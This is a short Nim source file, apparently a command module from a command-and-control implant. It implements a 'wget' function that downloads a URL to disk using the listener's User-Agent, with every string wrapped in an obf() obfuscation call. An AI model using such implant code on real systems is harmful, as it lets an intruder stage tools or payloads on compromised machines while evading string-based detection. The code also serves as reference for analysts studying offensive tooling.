import puppy
from strutils import join, split
from os import getcurrentdir, `/`
from ../util/webClient import Listener

# Curl an HTTP webpage to stdout
proc wget*(li : Listener, args : varargs[string]) : string =
    var 
        url : string
        filename : string
        res : string

    if args.len == 1 and args[0] != "":
        url = args[0]
        filename = getCurrentDir()/url.split(obf("/"))[^1]
    elif args.len >= 2:
        url = args[0]
        filename = args[1 .. ^1].join(obf(" "))
    else:
        result = obf("Invalid number of arguments received. Usage: 'wget [URL] <optional: path>'.")
        return
    
    res = fetch(
            url,
            headers = @[Header(key: obf("User-Agent"), value: li.userAgent)]
            )
    
    if res == "":
        result = obf("No response received. Ensure you format the url correctly and that the target server exists. Example: 'wget https://yourhost.com/file.exe'.")
    else:
        filename.writeFile(res)
        result = obf("Downloaded file from '") & url & obf("' to '") & filename & obf("'.")